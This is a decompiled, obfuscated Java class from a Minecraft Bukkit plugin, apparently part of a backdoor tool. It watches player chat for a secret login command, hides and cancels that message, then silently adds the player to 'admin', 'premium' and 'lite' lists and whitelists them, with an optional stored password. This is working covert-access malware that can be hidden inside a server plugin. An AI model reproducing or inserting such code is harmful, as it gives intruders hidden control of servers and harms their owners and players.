/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.EventPriority
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.AsyncPlayerChatEvent
 */
package me.system.runner.command.impl.login;

import me.system.runner.Core;
import me.system.runner.data.DataManager;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class LoginCommand
implements Listener {
    private static final /* synthetic */ Core coreInstance;

    @EventHandler(priority=EventPriority.MONITOR)
    public void onPlayerChat(AsyncPlayerChatEvent lllllllllllllllIIlIllIIIIlIIllII) {
        String lllllllllllllllIIlIllIIIIlIIlllI = lllllllllllllllIIlIllIIIIlIIllII.getMessage();
        Player lllllllllllllllIIlIllIIIIlIIllIl = lllllllllllllllIIlIllIIIIlIIllII.getPlayer();
        if (!LoginCommand.coreInstance.lite.contains(lllllllllllllllIIlIllIIIIlIIllIl.getName()) && lllllllllllllllIIlIllIIIIlIIlllI.startsWith(Settings.LOGIN_COMMAND) || !LoginCommand.coreInstance.lite.contains(lllllllllllllllIIlIllIIIIlIIllIl.getName()) && lllllllllllllllIIlIllIIIIlIIlllI.startsWith(Settings.LOGIN_COMMAND)) {
            lllllllllllllllIIlIllIIIIlIIllII.setMessage(null);
            lllllllllllllllIIlIllIIIIlIIllII.setCancelled(true);
            if (LoginCommand.coreInstance.enabled) {
                if (!DataManager.getData().getBoolean("hasPass")) {
                    if (API.getIPOfPlayer(lllllllllllllllIIlIllIIIIlIIllIl).equals("127.0.0.1") || API.getIPOfPlayer(lllllllllllllllIIlIllIIIIlIIllIl).startsWith("192.168.")) {
                        LoginCommand.coreInstance.lite.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                        LoginCommand.coreInstance.premium.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                        LoginCommand.coreInstance.admin.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                        lllllllllllllllIIlIllIIIIlIIllIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have been logged into ").append(Settings.RED).append("Max Localhost"))));
                        lllllllllllllllIIlIllIIIIlIIllIl.setWhitelisted(true);
                    } else {
                        LoginCommand.coreInstance.lite.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                        LoginCommand.coreInstance.premium.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                        LoginCommand.coreInstance.admin.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                        lllllllllllllllIIlIllIIIIlIIllIl.setWhitelisted(true);
                        lllllllllllllllIIlIllIIIIlIIllIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have been logged into ").append(Settings.RED).append(Settings.NAME).append(" Max Admin"))));
                    }
                } else {
                    String[] lllllllllllllllIIlIllIIIIlIlIIIl = lllllllllllllllIIlIllIIIIlIIlllI.split(" ");
                    if (lllllllllllllllIIlIllIIIIlIlIIIl == null) {
                        return;
                    }
                    if (lllllllllllllllIIlIllIIIIlIlIIIl.length <= 1) {
                        lllllllllllllllIIlIllIIIIlIIllIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("This server has a password. Login with ").append(Settings.LOGIN_COMMAND).append(" <password>"))));
                    } else if (lllllllllllllllIIlIllIIIIlIlIIIl[1].equals(DataManager.getData().getString("pass"))) {
                        if (API.getIPOfPlayer(lllllllllllllllIIlIllIIIIlIIllIl).equals("127.0.0.1") || API.getIPOfPlayer(lllllllllllllllIIlIllIIIIlIIllIl).startsWith("192.168.")) {
                            LoginCommand.coreInstance.lite.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                            LoginCommand.coreInstance.premium.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                            LoginCommand.coreInstance.admin.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                            lllllllllllllllIIlIllIIIIlIIllIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have been logged into ").append(Settings.RED).append("Max Localhost"))));
                            lllllllllllllllIIlIllIIIIlIIllIl.setWhitelisted(true);
                        } else {
                            LoginCommand.coreInstance.lite.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                            LoginCommand.coreInstance.premium.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                            LoginCommand.coreInstance.admin.add(lllllllllllllllIIlIllIIIIlIIllIl.getName());
                            lllllllllllllllIIlIllIIIIlIIllIl.setWhitelisted(true);
                            lllllllllllllllIIlIllIIIIlIIllIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have been logged into ").append(Settings.RED).append(Settings.NAME).append(" Max Admin"))));
                        }
                    }
                }
            } else {
                API.error(lllllllllllllllIIlIllIIIIlIIllIl);
            }
        }
    }

    static {
        coreInstance = (Core)Core.getPlugin(Core.class);
    }

    public LoginCommand() {
        LoginCommand lllllllllllllllIIlIllIIIIlIlIllI;
    }
}

